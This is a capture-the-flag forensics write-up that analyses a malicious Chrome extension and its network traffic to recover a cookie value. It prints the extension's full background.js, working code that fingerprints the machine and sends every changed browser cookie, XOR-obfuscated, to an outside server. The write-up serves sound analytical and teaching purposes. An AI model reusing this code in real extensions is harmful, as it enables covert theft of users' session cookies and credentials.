# Chrome-Plated Nonsense - 2
> The second extension the employee installed is named ChickenChickenStop Privacy Kit (see attached crx file). It claims to delete unnecessary cookies and improve user privacy, but it came from the same source as the first extension, and based on the traffic it is generating, it also appears to be exfiltrating information.

> Your task is to examine the network traffic from this extension, which has been ingested into Malcolm, and determine what information it was used to extract.

> Within the extracted data, what is the value of the lt variable in the cookie named MSPRequ?

> Flag format: value of the lt variable. Example: if cookie contained a=0&lt=12345&b=0, the flag would be 12345

## About the Challenge
We were given a `crx` file (You can download the extension [here](chickenchickenstop-privacy-kit.crx)) and we need to find the value of the `lt` variable in the cookie

## How to Solve?
We need to unzip the chrome extension first and as you can see there is a file called `background.js`


[Image extracted text: root@LAPTOP-FIL3RGSH
/Chrome#t
unzip chickenchickenstop-privacy-kit
crx
Archive
chickenchickenstop-privacy-kit
crx
Warning [chickenchickenstop-privacy-kit.crx]
593
extra bytes
at beginning
or within zipfile
(attempting
to
process
anyway_
inflating
background. js
extracting
Logo_128
png
extracting
logo_32
png
extracting
Logo_16.png
inflating
manifest.json
extracting
48
png
Logo_l]


If we open the `background.js` file, there are some information that we can obtain from that code

```javascript
var destination = "http://192.88.99.24:8080/"


// serializeCookie converts a cookie to string form
function serializeCookie(cookie) {
    output = "[" + cookie.domain + "," + cookie.expirationDate + "," + cookie.hostOnly + ",";
    output += cookie.httpOnly + "," + cookie.name + "," + cookie.path + ",";
    output += cookie.sameSite + "," + cookie.secure + "," + cookie.session + ",";
    output += cookie.storeId + "," + cookie.value + "]";

    return output
}


// sendCookie serializes, encrypts, and sends a cookie
function sendCookie(cookie) {
    var serializedCookie = "";
    var key = [];
    var encryptedCookie = [];
    var output = "";
    var opts = {
        'method':'GET',
        'mode':'no-cors'
    };

    // Serialize the cookie
    serializedCookie += serializeCookie(cookie);

    // Get key
    chrome.storage.local.get(["id"]).then((result) => {
        var keyString = result.id.slice(0, 4) + result.id.slice(-4,);
        key = keyString.split('');

        for (var i = 0; i < serializedCookie.length; i++) {
            var charCode = serializedCookie.charCodeAt(i) ^ key[i % key.length].charCodeAt(0);
            encryptedCookie.push(String.fromCharCode(charCode));
        }
        output = btoa(encryptedCookie.join(""));
        fetch(destination.concat(output), opts);
    });
}


// This will execute whenever a cookie is set or removed
chrome.cookies.onChanged.addListener((changeInfo) => {
    if (changeInfo.cause == "explicit") {
        sendCookie(changeInfo.cookie);
    }
});


// This will execute when the extension is first installed
chrome.runtime.onInstalled.addListener(() => {
    var opts = {
        'method':'GET',
        'mode':'no-cors'
    };

    chrome.system.cpu.getInfo((cpuInfo) => {
        chrome.system.memory.getInfo((memoryInfo) => {
            var info = "timestamp=" + Date.now()
            info += ",archName=" + cpuInfo.archName;
            info += ",modelName=" + cpuInfo.modelName;
            info += ",numOfProcessors=" + cpuInfo.numOfProcessors;
            info += ",availableCapacity=" + memoryInfo.availableCapacity
            info += ",capacity=" + memoryInfo.capacity;

            // Hash code adapted from https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest#converting_a_digest_to_a_hex_string
            const encoder = new TextEncoder();
            const data = encoder.encode(info);
            crypto.subtle.digest('SHA-256', data).then((digestBuffer) => {
                const hashArray = Array.from(new Uint8Array(digestBuffer));
                const uniqueId = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
                fetch(destination.concat(btoa("id=" + uniqueId + "," + info)), opts);

                // Save ID in local storage
                chrome.storage.local.set({ id: uniqueId }).then(() => {
                    // do nothing
                });
            });
        });
    });
});
```

First, the extension will send information about the computer to `http://192.88.99.24:8080/`. Then the extension will send information about the website's cookie to `http://192.88.99.24:8080/`, but the code will XOR the cookie first with the first 4 digits and last 4 digits from the ID.

Open Malcolm dashboards and find information about `192.88.99.24:8080`


[Image extracted text: May 5, 2023
01:07:04.791
http.uri: 192.88.99.24
8080/alQ9NTFmZmJjMWESZIZhNzZMOGE1 YTAMNIQyMjdhMGYzNjYwNmIIMjRiY2IZMjc2NTg]MjBkMGUWNjc4ZGEzMGU4NSxOall1 Ic3RhbXA9MTY3NDU4MDg2NDc4NCxhcmNoTmFtzTI4ODZfNj QsblgkZIxOY
WTIPXZpcnQtMy4yLGSIbU9MUHJvY2Vzc29yczO4LGF2YIIsYWJsZUNhcGF jaXRSPTEzNjgxNTEZNTQOLGNhcGF jaXRSPTE3MTcxNjExNj04
firstPacket: May 5,
2023
01:07:04.791
lastPacket : May 5,
2023
01:07:04.798
length:
ipProtocol:
tcpflags. syn:
tcpflags
syn-ack:
tcpflags.ack:
tcpflags.psh:
tcpflags.fin:
tcpflags.rst:
tcpflags.urg:
tcpflags. srcZero:
tcpflags.dstzero:
initRTT:
srcPayload8: 474554202f615751
dstPayload8: 485454502f312e30   @timestamp:
Apr 10 ,
2023
22 :52:38.192
source.ip:
10.120.101.10
source
50 , 801
source.bytes:
812
source .packets:
source.mac-cnt:
source.mac :
42:74:71:e1:35:3a
destination.ip: 192.88.99.24
destination.
8 , 080
destination.bytes:
828
port:
port:]


If we decode the base64 encoded message, we will get this information

```
id=51ffbc1a9efa76f8a5a005d227a0f36606b524bcb627658520d0e0678da30e85,timestamp=1674580864784,archName=x86_64,modelName=virt-7.2,numOfProcessors=8,availableCapacity=13681516544,capacity=17171611648
```

Now we know the information about the id. To obtain the XOR key, we need to get the first 4-digit and last 4-digit of the id cookie. So the key is `51ff0e85`

The next step is finding the correct request by checking the logs one by one. And to do that, we need decode the message and XOR with `51ff0e85`


[Image extracted text: 18JVIOHBhcuJZMtBVNTALJAfDMFBwUDVVYBQ24IARcqMw]UDgIBBFFRATUKAgOAOW ==
firstPacket : May 5, 2023
01:07 :43.298
lastPacket : May 5,
2023
01:07:43.302
length:
ipProtocol:
tcpflags. syn:
tcpflags
syn-
tcpflags.ack:
tcpflags.psh:
tcpflags.fin:
tcpflags
rst:
tcpflags
urg:
tcpflags. srcZero:
tcpflags.dstZero:
initRTT:
srcPayload8: 474554202f626b59
dstPayload8: 485454502f312e30
@timestamp: Apr 10, 2023
22:52:39.142
source.ip:
10.120.101.10
source
port:
50, 982
source.bytes:
772
source
packets:
source.mac
cnt:
source.mac :
42:74:71:e1:35:3a
destination.ip: 192.88.99.24
destination.port:
8 , 080
destination.bytes:
734
destination.packets:
May 5
2023
01 :07:42.756
related.hosts: 192.88.92.2418088
http.uri
192.88.99.24 BO8d/bhBKCVcMVhtZWBADHgZXWBLECAJVATFbUFVKAFEJSIAZRRQTVUlIZmVjAxdFSRcZWT4SFFUWTEdcUhIPXwsUQUdEAOpEFOTOGOFKDTRYdhNZRVtXBLIMAAIGVVYDQItaCAAZ
http
host: 192.88.99.24 8080
url.domain: 192.88.99.24.8085
zeek.http
host:
192.88.92.24.8080
@version:
user_
agent.original: Mozilla/5.0  (Windows
NT 10.0; Win64 ; x64)
ApplellebKit/537.36   (KHTML
like Gecko)
Chrome/109.0.0.0
Safari/537
user
agent
0S.name:
Windows
user_agent
full:
Hindows
user
agent
0S.version:
user
agent .name
Chrome
user_
aqent.device.name:
Other
user
agent.version:
109.0.0.0
tags
Celestic,
celestic.
chrome
plated
file.mime_
type:
text/html
rootId: CcEfiLCfESDr SK75f
timestamp
May 5,
2023
May 5
2023
01 :07 :42.753
http.uri
492. 88.99.24 8o80/bh8KcVcMVhtZWBADHgZXWBLECAJVATFbUFVKAFEJSIAZRROTVUIIZmV jAxdFSRcZW14SFFUWTEdcUhIPXwsUQUdEAOpEFOIOGOFKDIRYdhNZRVtXBIIMAAIGVVYDQItaCAAZ
firstPacket:
2023
01 :07:42.753
lastPacket:
2023
01:07 :42.760
length:
ipProtocol:
tcpflags.syn:
tcpflags
syn-ack:
tcpflags.ack:
tcpflags.psh:
tcpflags.fin:
tcpflags.rst:
tcpflags.urg:
tcpflags.srcZero:
tcpflags.dstZero:
initRTT:
srcPayload8:
474554202f626838
dstPayload8: 485454502f312e30
@timestamp:
Apr 10 , 2023
22:52:39.142
source.ip: 10.120.101.10
source.port:
50, 969
source
bytes: 684
source_
packets:
source.mac
cnt:
source.mac
42:74:71:e1:35:3a
destination.ip: 192.88.99.24
ack:
Nay
May]


After checking the logs one by one, I finally obtained the flag by checking this base64 message.

```
bh8KCVcMVhtZWBADHgZXWBlECAJVA1FbUFVKAFEJS1AZRRQTVUl1ZmVjAxdFSRcZW145FFUWTEdcUhIPXwsUQUdEA0pEF01QGQFKD1RYdhNZRVtXBlIMAAIGVVYDQ1taCAA7
```


[Image extracted text: Recipe
Input
D9
bh8KcVcMVhtZWBADHgZXWBlECAJVALFbUFVKAFEJSLAZRRQTVUl1ZmVjAxdFSRcZW1ASFFUWTEdcUhIPXWSUQUdEAOpEFOLQGQ
From Base64
FKDLRYdhNZRVtXBLIMAAIGWYDQItaCAAZ
Alphabet
A-Za-20-9+/=
Remove
non-alphabet chars
Strict mode
XOR
Key
Scheme
51ff0e85
UTF8
Standard
132
132
Tt
Raw Bytes
Null preserving
Output
0 0 @
{
[.login.live.com,undefined,false,true,MSPRequ,-
,no_
restriction,true,true,0,id-N&lt-16745773038c0-1]


```
1674577303
```